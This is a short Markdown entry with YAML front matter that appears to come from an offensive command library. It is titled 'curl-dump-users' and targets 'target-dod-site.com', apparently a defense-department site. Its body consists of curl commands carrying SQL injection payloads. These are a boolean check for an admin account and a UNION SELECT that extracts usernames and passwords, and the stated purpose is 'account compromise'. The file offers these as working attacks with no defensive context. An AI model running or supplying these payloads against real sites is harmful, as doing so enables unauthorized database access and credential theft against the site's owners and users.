---
id: cmd-uuid-4
name: curl-dump-users
type: command
executor: bash
data: >
  curl "https://target-dod-site.com/page?id=1' AND (SELECT COUNT(*) FROM users
  WHERE username='admin')>0--"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:15.100Z'
platforms:
  - Linux
  - macOS
tags:
  - sqli
  - dump
verified: false
validated: true
submitted: true
---

# curl-dump-users

## Command

```bash
curl "https://target-dod-site.com/page?id=1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--"
```

## Description

Dumps user data via conditional SQLi queries for account compromise.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `(SELECT COUNT(*) FROM users...)` | Query payload | Yes |

## Examples

### Basic Usage

```bash
curl "https://target.com?id=1' AND EXISTS(SELECT * FROM users)--"
```

### Advanced Usage

```bash
curl "https://target.com?id=1' UNION SELECT username,password FROM users--"
```

## Expected Output

True response if admin exists; extend for full dump.

## Related

- [[Related Procedure]]
